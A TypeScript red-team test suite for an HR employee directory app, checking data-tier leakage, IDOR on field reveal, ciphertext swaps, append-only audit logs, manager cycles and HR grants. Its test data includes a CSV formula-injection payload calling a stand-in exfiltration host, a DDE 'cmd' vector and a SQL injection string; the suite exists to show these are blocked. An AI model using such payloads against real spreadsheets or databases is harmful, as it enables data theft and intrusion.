import { isHttpError, isRedirect } from '@sveltejs/kit';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import type { SessionUser } from '#lib/server/auth/session';
import { getDb, type Db } from '#lib/server/db';
import { generateKeySecret } from '#lib/server/hr/crypto';
import { getEmployee } from '#lib/server/hr/repo';
import { openLocalD1 } from '../helpers/d1';
import { fakeEvent } from '../helpers/event';
import { auditRows, grantHr, hrWorld, seedEmployee } from '../helpers/seed-hr';
import { insertUser } from '../helpers/users';

/**
 * RB-05 red team, cycle 1: loads, actions and the export route against local D1, with a key generated per run (never
 * a real one). Findings: docs/features/rb-05-employee-directory/SECURITY_REPORT.md. The cycle 1 PROOF tests of L1-L3
 * now assert the cycle 2 fixes ("L<n> fixed"); the others prove a control that held.
 */

const KEY = generateKeySecret();
const binding: { DB?: D1Database; TEAM_TIME_ZONE: string; HR_DATA_KEY?: string } = {
	TEAM_TIME_ZONE: 'Asia/Jakarta',
	HR_DATA_KEY: KEY
};
vi.mock('#lib/server/env', () => ({ getEnv: () => binding }));

const directory = await import('../../src/routes/(app)/people/+page.server');
const org = await import('../../src/routes/(app)/people/org/+page.server');
const profile = await import('../../src/routes/(app)/people/[id]/+page.server');
const edit = await import('../../src/routes/(app)/people/[id]/edit/+page.server');
const audit = await import('../../src/routes/(app)/hr/audit/+page.server');
const exporter = await import('../../src/routes/(app)/hr/export/+server');
const adminUsers = await import('../../src/routes/(app)/admin/users/+page.server');

let db: Db;
let raw: D1Database;
let dispose: () => Promise<void>;
beforeAll(async () => {
	const opened = await openLocalD1();
	binding.DB = opened.db;
	raw = opened.db;
	db = getDb(opened.db);
	dispose = opened.dispose;
});
afterAll(() => dispose());

type Fn = (event: never) => unknown;
async function run(fn: unknown, event: unknown): Promise<unknown> {
	try {
		return await (fn as Fn)(event as never);
	} catch (e) {
		return e;
	}
}
const status = (r: unknown) =>
	isHttpError(r)
		? r.status
		: isRedirect(r)
			? r.status
			: ((r as { status?: number })?.status ?? 200);

function req(
	user: SessionUser | null,
	path: string,
	options: { form?: Record<string, string>; params?: Record<string, string>; method?: string } = {}
) {
	return fakeEvent({
		url: `http://localhost${path}`,
		db,
		user,
		form: options.form,
		params: options.params,
		method: options.method
	}).event;
}
const act = (
	fn: unknown,
	user: SessionUser | null,
	id: string,
	form: Record<string, string>,
	path = `/people/${id}`
) => run(fn, req(user, path, { params: { id }, form }));
const reveal = (user: SessionUser, id: string, field: string, ref = '') =>
	act(profile.actions.reveal, user, id, { field, ref });
const viewProfile = (user: SessionUser, id: string) =>
	run(profile.load, req(user, `/people/${id}`, { params: { id } }));
const updatedAt = async (id: string) => String((await getEmployee(db, id))!.updatedAt);

async function setSensitive(hr: SessionUser, id: string, fields: Record<string, string>) {
	const loaded = (await run(edit.load, req(hr, `/people/${id}/edit`, { params: { id } }))) as {
		personal: { updatedAt: number };
	};
	return act(
		edit.actions.updateSensitive,
		hr,
		id,
		{ expectedUpdatedAt: String(loaded.personal.updatedAt), ...fields },
		`/people/${id}/edit`
	);
}

const SECRETS = {
	nik: '3171098765432109',
	npwp: '091234567890123',
	bpjs_kes: '0001234567891',
	bank_account: '7788990011223',
	home_address: 'Jl. Fiktif Rahasia No. 77',
	personal_email: 'rahasia.fiktif@example.test',
	personal_phone: '+62 811 7777 1234',
	birth_date: '1990-02-03',
	bank_holder: 'Pemilik Fiktif'
};
const SALARY = { effectiveOn: '2026-01-01', amount: '23.456.789', note: 'Gaji fiktif rahasia' };

/** A world whose report has every tier 2 field, one contact and one salary record. */
async function loadedWorld() {
	const w = await hrWorld(db);
	const id = w.employees.report;
	expect(status(await setSensitive(w.users.hr, id, SECRETS))).toBe(200);
	expect(
		status(
			await act(profile.actions.addContact, w.users.hr, id, {
				contactName: 'Kerabat Fiktif',
				relationship: 'Sibling',
				contactPhone: '0812 3456 7890'
			})
		)
	).toBe(200);
	expect(
		status(await act(edit.actions.addCompensation, w.users.hr, id, SALARY, `/people/${id}/edit`))
	).toBe(200);
	return w;
}

/** Every value that must not reach a viewer below tier 2 (or tier 3 for the salary), plaintext and ciphertext. */
function tier2Needles() {
	return [
		...Object.values(SECRETS),
		'Kerabat Fiktif',
		'0812 3456 7890',
		'Gaji fiktif',
		'23456789',
		'23.456.789',
		'v1.'
	];
}

describe('payload scans: no tier 2/3 value or ciphertext in any loader output', () => {
	it('directory, search, org chart and profile, for every non-HR viewer', async () => {
		const w = await loadedWorld();
		const id = w.employees.report;
		const viewers = {
			outsider: w.users.outsider,
			manager: w.users.managerUser,
			skipLevel: w.users.topUser,
			adminNotHr: w.users.admin
		};
		for (const [who, user] of Object.entries(viewers)) {
			const pages = [
				await run(directory.load, req(user, `/people?q=${encodeURIComponent('Report Person')}`)),
				await run(directory.load, req(user, `/people?status=all&q=${w.tag}`)),
				await run(org.load, req(user, '/people/org')),
				await viewProfile(user, id)
			];
			const text = JSON.stringify(pages);
			for (const needle of tier2Needles()) expect(text, `${who}: ${needle}`).not.toContain(needle);
			// Last four digits are tier 2 as well: only self and HR see the mask.
			expect(text, who).not.toContain(SECRETS.nik.slice(-4));
			// Tier 1 only for the direct manager.
			if (who !== 'manager') expect(text, who).not.toContain(`EMP-${w.tag}`);
		}
	});

	it('self and HR get masks and flags, never a value or a ciphertext', async () => {
		const w = await loadedWorld();
		const id = w.employees.report;
		const self = JSON.stringify(await viewProfile(w.users.reportUser, id));
		const hrProfile = JSON.stringify(await viewProfile(w.users.hr, id));
		const hrEdit = JSON.stringify(
			await run(edit.load, req(w.users.hr, `/people/${id}/edit`, { params: { id } }))
		);
		for (const [who, text] of Object.entries({ self, hrProfile, hrEdit }))
			for (const needle of tier2Needles()) expect(text, `${who}: ${needle}`).not.toContain(needle);
		expect(self).toContain(`•••• ${SECRETS.nik.slice(-4)}`);
		// Salary metadata is tier 3: not even its existence reaches self.
		expect(self).not.toContain(SALARY.effectiveOn);
	});

	it('the CSV export holds no tier 2/3 value or ciphertext', async () => {
		const w = await loadedWorld();
		const res = (await run(
			exporter.POST,
			req(w.users.hr, '/hr/export', { method: 'POST' })
		)) as Response;
		expect(res.status).toBe(200);
		expect(res.headers.get('cache-control')).toBe('no-store');
		const csv = await res.text();
		for (const needle of tier2Needles()) expect(csv).not.toContain(needle);
	});
});

describe('session edge cases', () => {
	it('an HR user whose account is disabled (stale session) is not HR', async () => {
		const w = await loadedWorld();
		await db.$client
			.prepare("UPDATE users SET status = 'disabled' WHERE id = ?1")
			.bind(w.users.hr.id)
			.run();
		const page = (await viewProfile(w.users.hr, w.employees.report)) as Record<string, unknown>;
		expect(page.personal).toBeNull();
		expect(page.compensation).toBeNull();
		expect(status(await reveal(w.users.hr, w.employees.report, 'nik'))).toBe(404);
		expect(
			status(await run(exporter.POST, req(w.users.hr, '/hr/export', { method: 'POST' })))
		).toBe(403);
	});

	it('an HR flag revoked mid-session stops reveal, edit, export and audit on the next request', async () => {
		const w = await loadedWorld();
		const id = w.employees.report;
		expect(status(await reveal(w.users.hr, id, 'nik'))).toBe(200);
		await db.$client.prepare('UPDATE users SET is_hr = 0 WHERE id = ?1').bind(w.users.hr.id).run();
		const before = (await auditRows(db, { actorId: w.users.hr.id })).length;
		expect(status(await reveal(w.users.hr, id, 'nik'))).toBe(404);
		expect(
			status(await run(edit.load, req(w.users.hr, `/people/${id}/edit`, { params: { id } })))
		).toBe(403);
		expect(status(await run(audit.load, req(w.users.hr, '/hr/audit')))).toBe(403);
		expect(
			status(await run(exporter.POST, req(w.users.hr, '/hr/export', { method: 'POST' })))
		).toBe(403);
		expect((await auditRows(db, { actorId: w.users.hr.id })).length).toBe(before);
	});

	it('a linked employee that is soft-deleted loses self and manager rights', async () => {
		const w = await loadedWorld();
		const hr = w.users.hr;
		// Delete the manager's own employee record: the manager user is no longer anyone's manager.
		expect(
			status(
				await act(
					edit.actions.delete,
					hr,
					w.employees.manager,
					{ expectedUpdatedAt: await updatedAt(w.employees.manager), confirm: 'on' },
					`/people/${w.employees.manager}/edit`
				)
			)
		).toBe(303);
		const asManager = (await viewProfile(w.users.managerUser, w.employees.report)) as {
			employment: unknown;
		};
		expect(asManager.employment).toBeNull();
		// Delete the report: its own user no longer sees or reveals it.
		expect(
			status(
				await act(
					edit.actions.delete,
					hr,
					w.employees.report,
					{ expectedUpdatedAt: await updatedAt(w.employees.report), confirm: 'on' },
					`/people/${w.employees.report}/edit`
				)
			)
		).toBe(303);
		expect(status(await viewProfile(w.users.reportUser, w.employees.report))).toBe(404);
		expect(status(await reveal(w.users.reportUser, w.employees.report, 'nik'))).toBe(404);
	});
});

describe('reveal: IDOR, tiers and audit', () => {
	it('ids from the form never widen scope', async () => {
		const w = await loadedWorld();
		const report = w.employees.report;
		const { results } = await raw
			.prepare('SELECT id FROM employee_emergency_contacts WHERE employee_id = ?1')
			.bind(report)
			.all<{ id: string }>();
		const contactId = results[0]!.id;
		const salaryId = (await raw
			.prepare('SELECT id FROM employee_compensation WHERE employee_id = ?1')
			.bind(report)
			.first<{ id: string }>())!.id;
		// The manager links their own record and posts the report's contact id against it.
		const viaOwn = await reveal(
			w.users.managerUser,
			w.employees.manager,
			'contact_name',
			contactId
		);
		expect(status(viaOwn)).toBe(400);
		expect(JSON.stringify(viaOwn)).not.toContain('Kerabat');
		// Self cannot reveal own salary (tier 3), with or without the right ref.
		expect(status(await reveal(w.users.reportUser, report, 'compensation_amount', salaryId))).toBe(
			404
		);
		expect(status(await reveal(w.users.reportUser, report, 'compensation_note', salaryId))).toBe(
			404
		);
		// Manager and admin: 404 on every tier 2 field and contact.
		for (const user of [w.users.managerUser, w.users.admin, w.users.topUser])
			for (const field of ['nik', 'home_address', 'contact_phone'])
				expect(status(await reveal(user, report, field, contactId))).toBe(404);
		// Field-name injection into the `${field}_enc` column name is refused before SQL.
		for (const field of ['nik_enc', 'nik, nik_last4', '__proto__', 'constructor', 'bank_name'])
			expect(status(await reveal(w.users.hr, report, field))).toBe(400);
		// Batch: only the first `field` is read, one value out.
		const twice = (await run(
			profile.actions.reveal,
			fakeEvent({
				url: `http://localhost/people/${report}`,
				db,
				user: w.users.hr,
				params: { id: report },
				form: [
					['field', 'nik'],
					['field', 'npwp']
				]
			}).event
		)) as { revealed: { value: string } };
		expect(JSON.stringify(twice)).not.toContain(SECRETS.npwp);
		// No audit rows for the refused attempts by others.
		for (const user of [w.users.managerUser, w.users.admin, w.users.topUser])
			expect(await auditRows(db, { actorId: user.id })).toEqual([]);
	});

	it('HR cannot remove or reveal another employee’s contact through a different profile', async () => {
		const w = await loadedWorld();
		const contactId = (await raw
			.prepare('SELECT id FROM employee_emergency_contacts WHERE employee_id = ?1')
			.bind(w.employees.report)
			.first<{ id: string }>())!.id;
		const res = await act(profile.actions.removeContact, w.users.hr, w.employees.contractor, {
			contactId
		});
		expect(status(res)).toBe(404);
		// The member who is not that employee cannot remove it either (404 before any id is read).
		expect(
			status(
				await act(profile.actions.removeContact, w.users.managerUser, w.employees.report, {
					contactId
				})
			)
		).toBe(404);
		const live = await raw
			.prepare('SELECT deleted_at FROM employee_emergency_contacts WHERE id = ?1')
			.bind(contactId)
			.first<{ deleted_at: number | null }>();
		expect(live?.deleted_at).toBeNull();
	});

	it('swapped ciphertexts (row, field, contact, salary record) fail closed with a generic error', async () => {
		const w = await loadedWorld();
		const w2 = await loadedWorld();
		const a = w.employees.report;
		const b = w2.employees.report;
		// Field swap inside a row: nik <- npwp.
		await raw
			.prepare('UPDATE employee_private SET nik_enc = npwp_enc WHERE employee_id = ?1')
			.bind(a)
			.run();
		// Row swap: a.home_address <- b.home_address.
		await raw
			.prepare(
				`UPDATE employee_private SET home_address_enc =
				 (SELECT home_address_enc FROM employee_private WHERE employee_id = ?2) WHERE employee_id = ?1`
			)
			.bind(a, b)
			.run();
		// Contact field swap: name <- phone.
		await raw
			.prepare('UPDATE employee_emergency_contacts SET name_enc = phone_enc WHERE employee_id = ?1')
			.bind(a)
			.run();
		const contactId = (await raw
			.prepare('SELECT id FROM employee_emergency_contacts WHERE employee_id = ?1')
			.bind(a)
			.first<{ id: string }>())!.id;
		// A salary record with b's amount ciphertext copied in (append-only, so a new row).
		const bAmount = (await raw
			.prepare('SELECT amount_enc FROM employee_compensation WHERE employee_id = ?1')
			.bind(b)
			.first<{ amount_enc: string }>())!.amount_enc;
		const forged = crypto.randomUUID();
		await raw
			.prepare(
				`INSERT INTO employee_compensation (id, employee_id, effective_on, amount_enc, currency, key_version,
				 created_by, created_at) VALUES (?1, ?2, '2026-02-01', ?3, 'IDR', 1, ?4, 1)`
			)
			.bind(forged, a, bAmount, w.users.hr.id)
			.run();
		for (const [field, ref] of [
			['nik', ''],
			['home_address', ''],
			['contact_name', contactId],
			['compensation_amount', forged]
		] as const) {
			const res = await reveal(w.users.hr, a, field, ref);
			expect(status(res), field).toBe(500);
			const text = JSON.stringify(res);
			expect(text).toContain('cannot be read with the current key');
			for (const needle of tier2Needles().slice(0, -1)) expect(text).not.toContain(needle);
		}
		// The untouched field still decrypts.
		const ok = (await reveal(w.users.hr, a, 'npwp')) as { revealed: { value: string } };
		expect(ok.revealed.value).toBe(SECRETS.npwp);
	});

	it('a missing or malformed HR_DATA_KEY refuses reveal and every tier 2/3 write (503), nothing changes', async () => {
		const w = await loadedWorld();
		const id = w.employees.report;
		const before = await raw
			.prepare('SELECT * FROM employee_private WHERE employee_id = ?1')
			.bind(id)
			.first();
		for (const bad of [undefined, '', 'short', `${KEY}A`, KEY.slice(1), ' '.repeat(43)]) {
			binding.HR_DATA_KEY = bad;
			expect(status(await reveal(w.users.hr, id, 'nik')), String(bad)).toBe(503);
			expect(status(await setSensitive(w.users.hr, id, { nik: '1111222233334444' }))).toBe(503);
			expect(
				status(
					await act(edit.actions.addCompensation, w.users.hr, id, SALARY, `/people/${id}/edit`)
				)
			).toBe(503);
			expect(
				status(
					await act(profile.actions.addContact, w.users.reportUser, id, {
						contactName: 'X Fiktif',
						relationship: 'Sibling',
						contactPhone: '0812 0000 0000'
					})
				)
			).toBe(503);
		}
		binding.HR_DATA_KEY = KEY;
		const after = await raw
			.prepare('SELECT * FROM employee_private WHERE employee_id = ?1')
			.bind(id)
			.first();
		expect(after).toEqual(before);
	});
});

describe('audit log integrity', () => {
	it('the app has no UPDATE/DELETE path; direct UPDATE, DELETE and UPSERT abort', async () => {
		const w = await loadedWorld();
		const row = (await raw
			.prepare('SELECT id FROM hr_audit_log WHERE actor_id = ?1 LIMIT 1')
			.bind(w.users.hr.id)
			.first<{ id: string }>())!;
		await expect(
			raw.prepare("UPDATE hr_audit_log SET detail = 'x' WHERE id = ?1").bind(row.id).run()
		).rejects.toThrow(/append-only/);
		await expect(
			raw.prepare('DELETE FROM hr_audit_log WHERE id = ?1').bind(row.id).run()
		).rejects.toThrow(/append-only/);
		await expect(
			raw
				.prepare(
					`INSERT INTO hr_audit_log (id, at, actor_id, action) VALUES (?1, 1, ?2, 'export')
					 ON CONFLICT(id) DO UPDATE SET action = excluded.action`
				)
				.bind(row.id, w.users.hr.id)
				.run()
		).rejects.toThrow(/append-only/);
	});

	it('L2 fixed: INSERT OR REPLACE cannot rewrite an audit row or a salary row', async () => {
		const w = await loadedWorld();
		const row = (await raw
			.prepare(
				"SELECT id, action, detail FROM hr_audit_log WHERE actor_id = ?1 AND action = 'compensation_add' LIMIT 1"
			)
			.bind(w.users.hr.id)
			.first<{ id: string; action: string; detail: string }>())!;
		await expect(
			raw
				.prepare(
					`INSERT OR REPLACE INTO hr_audit_log (id, at, actor_id, action, fields, detail)
					 VALUES (?1, 1, ?2, 'export', '[]', 'rewritten')`
				)
				.bind(row.id, w.users.hr.id)
				.run()
		).rejects.toThrow(/append-only/);
		const after = await raw
			.prepare('SELECT action, detail FROM hr_audit_log WHERE id = ?1')
			.bind(row.id)
			.first<{ action: string; detail: string }>();
		expect(after).toEqual({ action: row.action, detail: row.detail });
		const salary = (await raw
			.prepare('SELECT * FROM employee_compensation WHERE employee_id = ?1')
			.bind(w.employees.report)
			.first<Record<string, unknown>>())!;
		await expect(
			raw
				.prepare(
					`INSERT OR REPLACE INTO employee_compensation (id, employee_id, effective_on, amount_enc, currency,
					 key_version, created_by, created_at) VALUES (?1, ?2, '1999-01-01', 'v1.x.y', 'IDR', 1, ?3, 1)`
				)
				.bind(salary.id, w.employees.report, w.users.hr.id)
				.run()
		).rejects.toThrow(/append-only/);
		const kept = await raw
			.prepare('SELECT effective_on FROM employee_compensation WHERE id = ?1')
			.bind(salary.id)
			.first<{ effective_on: string }>();
		expect(kept?.effective_on).toBe(salary.effective_on);
		// A plain insert of an existing id is refused the same way; new ids still insert.
		await expect(
			raw
				.prepare(
					`INSERT OR IGNORE INTO hr_audit_log (id, at, actor_id, action) VALUES (?1, 1, ?2, 'export')`
				)
				.bind(row.id, w.users.hr.id)
				.run()
		).rejects.toThrow(/append-only/);
		await raw
			.prepare(`INSERT INTO hr_audit_log (id, at, actor_id, action) VALUES (?1, 1, ?2, 'export')`)
			.bind(crypto.randomUUID(), w.users.hr.id)
			.run();
	});

	it('L1 fixed: a non-HR admin does not see names of terminated or soft-deleted employees on /hr/audit', async () => {
		const w = await hrWorld(db);
		const hr = w.users.hr;
		const gone = await seedEmployee(db, hr.id, { fullName: `Deleted Fiktif ${w.tag}` });
		const left = await seedEmployee(db, hr.id, { fullName: `Terminated Fiktif ${w.tag}` });
		expect(
			status(
				await act(
					edit.actions.delete,
					hr,
					gone,
					{ expectedUpdatedAt: await updatedAt(gone), confirm: 'on' },
					`/people/${gone}/edit`
				)
			)
		).toBe(303);
		expect(
			status(
				await act(
					edit.actions.terminate,
					hr,
					left,
					{ expectedUpdatedAt: await updatedAt(left), endOn: '2026-10-01', confirm: 'on' },
					`/people/${left}/edit`
				)
			)
		).toBe(200);
		// The same admin gets 404 on both profiles and sees neither in the directory…
		expect(status(await viewProfile(w.users.admin, gone))).toBe(404);
		expect(status(await viewProfile(w.users.admin, left))).toBe(404);
		const dir = JSON.stringify(await run(directory.load, req(w.users.admin, `/people?q=${w.tag}`)));
		expect(dir).not.toContain('Deleted Fiktif');
		expect(dir).not.toContain('Terminated Fiktif');
		// …and the audit page names neither: not in the employee filter, not on its rows.
		const loaded = (await run(audit.load, req(w.users.admin, '/hr/audit'))) as {
			rows: { action: string; employeeName: string | null; employeeHidden: boolean }[];
			employees: { id: string }[];
		};
		const page = JSON.stringify(loaded);
		expect(page).not.toContain(`Deleted Fiktif ${w.tag}`);
		expect(page).not.toContain(`Terminated Fiktif ${w.tag}`);
		expect(loaded.employees.map((e) => e.id)).not.toContain(gone);
		expect(loaded.employees.map((e) => e.id)).not.toContain(left);
		// The rows stay (the admin watches HR), without the name.
		const hidden = loaded.rows.filter((r) => r.employeeHidden);
		expect(hidden.map((r) => r.action)).toEqual(
			expect.arrayContaining(['employee_delete', 'employee_terminate'])
		);
		expect(hidden.every((r) => r.employeeName === null)).toBe(true);
		// HR still sees everything.
		const hrPage = JSON.stringify(await run(audit.load, req(hr, '/hr/audit')));
		expect(hrPage).toContain(`Deleted Fiktif ${w.tag}`);
		expect(hrPage).toContain(`Terminated Fiktif ${w.tag}`);
	});
});

describe('manager cycle', () => {
	it('L3 fixed: soft delete, re-parent, restore cannot close a manager cycle', async () => {
		const w = await hrWorld(db);
		const hr = w.users.hr;
		const a = await seedEmployee(db, hr.id, { fullName: `Cycle A ${w.tag}` });
		const b = await seedEmployee(db, hr.id, { fullName: `Cycle B ${w.tag}`, managerId: a });
		const c = await seedEmployee(db, hr.id, { fullName: `Cycle C ${w.tag}`, managerId: b });
		const setManager = async (id: string, name: string, managerId: string) =>
			act(
				edit.actions.updateWork,
				hr,
				id,
				{
					expectedUpdatedAt: await updatedAt(id),
					fullName: name,
					employmentType: 'permanent',
					managerId
				},
				`/people/${id}/edit`
			);
		expect(status(await setManager(a, `Cycle A ${w.tag}`, c))).toBe(400);
		expect(
			status(
				await act(
					edit.actions.delete,
					hr,
					b,
					{ expectedUpdatedAt: await updatedAt(b), confirm: 'on' },
					`/people/${b}/edit`
				)
			)
		).toBe(303);
		// The walk sees the deleted B, so C still counts as below A: the re-parent is refused.
		expect(status(await setManager(a, `Cycle A ${w.tag}`, c))).toBe(400);

		// A loop prepared behind the app's back (raw SQL) is caught by the restore guard itself.
		await raw.prepare('UPDATE employees SET manager_id = ?1 WHERE id = ?2').bind(c, a).run();
		const refused = await act(
			edit.actions.restore,
			hr,
			b,
			{ expectedUpdatedAt: await updatedAt(b) },
			`/people/${b}/edit`
		);
		expect(status(refused)).toBe(400);
		expect(JSON.stringify(refused)).toContain('Its manager now reports to this employee');
		expect((await getEmployee(db, b))!.deletedAt).not.toBeNull();
		// Fix the loop, then the restore goes through.
		await raw.prepare('UPDATE employees SET manager_id = NULL WHERE id = ?1').bind(a).run();
		expect(
			status(
				await act(
					edit.actions.restore,
					hr,
					b,
					{ expectedUpdatedAt: await updatedAt(b) },
					`/people/${b}/edit`
				)
			)
		).toBe(200);
		const chain = await Promise.all([a, b, c].map((id) => getEmployee(db, id)));
		expect(chain.map((e) => e!.managerId)).toEqual([null, a, b]);
	});
});

describe('HR grants', () => {
	const setHr = (actor: SessionUser, userId: string, isHr: string, origin?: string) =>
		run(
			adminUsers.actions.setHr,
			fakeEvent({
				url: 'http://localhost/admin/users',
				db,
				user: actor,
				form: { userId, isHr },
				headers: origin ? { origin } : undefined
			}).event
		);

	it('a demoted or disabled admin with a stale session cannot grant; the guard is in the UPDATE', async () => {
		const w = await hrWorld(db);
		const target = await insertUser(db);
		const stale = await insertUser(db, { role: 'admin' });
		await db.$client.prepare("UPDATE users SET role = 'member' WHERE id = ?1").bind(stale.id).run();
		expect(status(await setHr(stale, target.id, '1'))).toBe(400);
		expect(status(await setHr(stale, stale.id, '1'))).toBe(400);
		const flags = await db.$client
			.prepare('SELECT is_hr FROM users WHERE id IN (?1, ?2)')
			.bind(target.id, stale.id)
			.all<{ is_hr: number }>();
		expect(flags.results.every((r) => r.is_hr === 0)).toBe(true);
		expect(await auditRows(db, { actorId: stale.id })).toEqual([]);
		// Members and HR without admin: 403.
		expect(status(await setHr(w.users.hr, w.users.hr.id, '0'))).toBe(403);
		expect(status(await setHr(w.users.outsider, w.users.outsider.id, '1'))).toBe(403);
		// Unknown values and ids.
		for (const v of ['2', 'true', '', '1 '])
			expect(status(await setHr(w.users.admin, target.id, v))).toBe(400);
		expect(status(await setHr(w.users.admin, "x' OR 1=1 --", '1'))).toBe(400);
		// A no-op grant writes no audit row.
		await grantHr(db, target.id);
		const before = (await auditRows(db, { actorId: w.users.admin.id })).length;
		expect(status(await setHr(w.users.admin, target.id, '1'))).toBe(200);
		expect((await auditRows(db, { actorId: w.users.admin.id })).length).toBe(before);
	});
});

describe('export', () => {
	it('formula prefixes in every exported column are neutralised', async () => {
		const w = await hrWorld(db);
		const vectors = [
			'=HYPERLINK("http://evil.example/?x="&A1,"click")',
			'+1+cmd|',
			'-2+3',
			'@SUM(A1:A9)'
		];
		for (const [i, v] of vectors.entries())
			await seedEmployee(db, w.users.hr.id, {
				fullName: `${v} ${w.tag}`,
				jobTitle: v,
				department: v,
				location: v,
				employeeNo: `-${w.tag}${i}`
			});
		const res = (await run(
			exporter.POST,
			req(w.users.hr, '/hr/export', { method: 'POST' })
		)) as Response;
		const csv = await res.text();
		const cells = csv.split(/\r\n/).flatMap((line) => line.match(/"(?:[^"]|"")*"/g) ?? []);
		for (const cell of cells) expect(cell).not.toMatch(/^"[=+\-@\t\r]/);
		expect(csv).toContain(`"'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")`);
		expect(res.headers.get('content-disposition')).toMatch(
			/^attachment; filename="people-\d{4}-\d{2}-\d{2}\.csv"$/
		);
	});
});
